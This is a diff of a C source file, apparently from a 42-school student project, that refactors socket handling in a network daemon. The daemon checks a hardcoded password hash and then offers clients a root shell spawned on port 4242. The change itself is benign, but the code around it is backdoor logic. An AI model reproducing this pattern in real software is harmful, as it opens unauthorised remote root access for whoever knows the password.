@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/05 10:27:26 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/08 16:17:01 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/09 10:11:31 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,7 +28,7 @@ pthread_attr_t		thread_init()
 	return (thread_attr);
 }
 
-static void			loop(t_thread_params *c, char *buffer, int *ret)
+static void			loop(t_thread_params *c, char *buffer, int *ret, int sock)
 {
 	char const		*pass = "A9ydQdSSfi/JY";
 	char			salt[] = "A9";
@@ -36,7 +36,7 @@ static void			loop(t_thread_params *c, char *buffer, int *ret)
 	char			str[256];
 	bool			is_logged = false;
 
-	while ((*ret = recv(c->csock, buffer, BUF_SIZE, 0)) > 0) {
+	while ((*ret = recv(sock, buffer, BUF_SIZE, 0)) > 0) {
 		char *trim = strtrim(buffer);
 		bzero(str, sizeof(str));
 		if (!trim)
@@ -50,28 +50,28 @@ static void			loop(t_thread_params *c, char *buffer, int *ret)
 				snprintf(str, sizeof(str), "[Client %s:%d] %s",
 					c->cli_ip, c->cli_port, message);
 				print_logs_n(c->logs, str);
-				send(c->csock, message, strlen(message), 0);
+				send(sock, message, strlen(message), 0);
 				message = "[Daemon] Type \"shell\" to run the root shell.\n";
-				send(c->csock, message, strlen(message), 0);
+				send(sock, message, strlen(message), 0);
 				is_logged = true;
 			} else {
 				message = "[Daemon] Authentication failed. Try again.\n";
 				snprintf(str, sizeof(str), "[Client %s:%d] %s",
 					c->cli_ip, c->cli_port, message);
 				print_logs_n(c->logs, str);
-				send(c->csock, message, strlen(message), 0);
+				send(sock, message, strlen(message), 0);
 			}
 		} else {
 			if (!strcmp(trim, "shell")) {
 				c->shell_on = true;
 				message = "[Daemon] Spawning shell on port 4242.\n";
-				send(c->csock, message, strlen(message), 0);
+				send(sock, message, strlen(message), 0);
 				strdel(&trim);
 				*ret = 0;
 				break;
 			} else {
 				message = "[Daemon] Not a valid command. Try again.\n";
-				send(c->csock, message, strlen(message), 0);
+				send(sock, message, strlen(message), 0);
 			}
 		}
 		bzero(str, sizeof(str));
@@ -91,7 +91,8 @@ void				*thread_handler(void *context)
 	bzero(buffer, sizeof(buffer));
 	char *message = "Password: ";
     send(c->csock, message, strlen(message), 0);
-	loop(c, buffer, &ret);
+	int sock = c->csock;
+	loop(c, buffer, &ret, sock);
     if (ret == 0)
     {
 		pthread_mutex_lock(&lock);
